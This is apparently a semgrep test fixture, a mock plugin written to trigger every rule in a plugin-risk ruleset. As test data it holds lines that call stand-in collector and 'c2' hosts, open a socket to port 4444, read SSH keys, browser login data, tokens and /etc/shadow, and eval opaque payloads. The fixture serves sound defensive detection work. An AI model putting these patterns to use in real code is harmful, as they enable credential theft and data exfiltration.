// A plugin that does everything .semgrep/plugin-risk.yml looks for. Every
// `ruleid:` line must be reported (semgrep --test); nothing here runs.
// ruleid: vestra-child-process
import { execFile } from "node:child_process";
// ruleid: vestra-child-process
import * as cluster from "cluster";
// ruleid: vestra-dynamic-code
import vm from "node:vm";
// ruleid: vestra-raw-network
import { connect } from "node:net";
// ruleid: vestra-native-addon
import inspector from "node:inspector";
import { homedir } from "node:os";
import os from "node:os";
import { Worker } from "node:worker_threads";

declare const plugin: { dataDirectory: string };
declare const payload: string;
declare const name: string;

export async function run() {
  execFile("calc.exe");
  // ruleid: vestra-child-process
  const cp = require("child_process");
  // ruleid: vestra-dynamic-code
  eval(payload);
  // ruleid: vestra-dynamic-code
  const f = new Function("a", payload);
  // ruleid: vestra-dynamic-code
  setTimeout("steal()", 10);
  // ruleid: vestra-dynamic-code
  new Worker(payload, { eval: true });
  vm.runInNewContext(payload);
  // ruleid: vestra-dynamic-import
  await import(name);
  // ruleid: vestra-dynamic-import
  require(`./${name}`);
  // ruleid: vestra-native-addon
  require("./build/Release/evil.node");
  // ruleid: vestra-native-addon
  process.dlopen({ exports: {} }, plugin.dataDirectory + "/x.node");
  // ruleid: vestra-network-host
  await fetch("https://collector.example.net/upload", { method: "POST" });
  // ruleid: vestra-network-host
  connect(4444, "203.0.113.7");
  // ruleid: vestra-network-host
  new WebSocket(`wss://c2.example.org/${name}`);
  // ruleid: vestra-path-outside-plugin
  const home = homedir();
  // ruleid: vestra-path-outside-plugin
  const profile = os.homedir();
  // ruleid: vestra-path-outside-plugin
  const appData = process.env.APPDATA;
  // ruleid: vestra-path-outside-plugin
  const shadow = "/etc/shadow";
  // ruleid: vestra-path-outside-plugin
  const system = "C:\\Windows\\System32";
  // ruleid: vestra-path-outside-plugin
  const up = plugin.dataDirectory + "/../../other-plugin";
  // ruleid: vestra-credentials
  const ssh = home + "/.ssh/id_rsa";
  // ruleid: vestra-credentials
  const chrome = "Google/Chrome/User Data/Default/Login Data";
  // ruleid: vestra-credentials
  const token = process.env.GITHUB_TOKEN;
  // ruleid: vestra-credentials
  const everything = JSON.stringify(process.env);
  // ruleid: vestra-obfuscation
  const blob = "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQ=";
  // ruleid: vestra-dynamic-code, vestra-obfuscation
  eval(atob(blob));
  // ruleid: vestra-obfuscation
  const hidden = String.fromCharCode(114, 101, 113, 117, 105, 114, 101, 40);
  return [cp, f, home, profile, appData, shadow, system, up, ssh, chrome, token, everything, hidden, cluster, inspector];
}
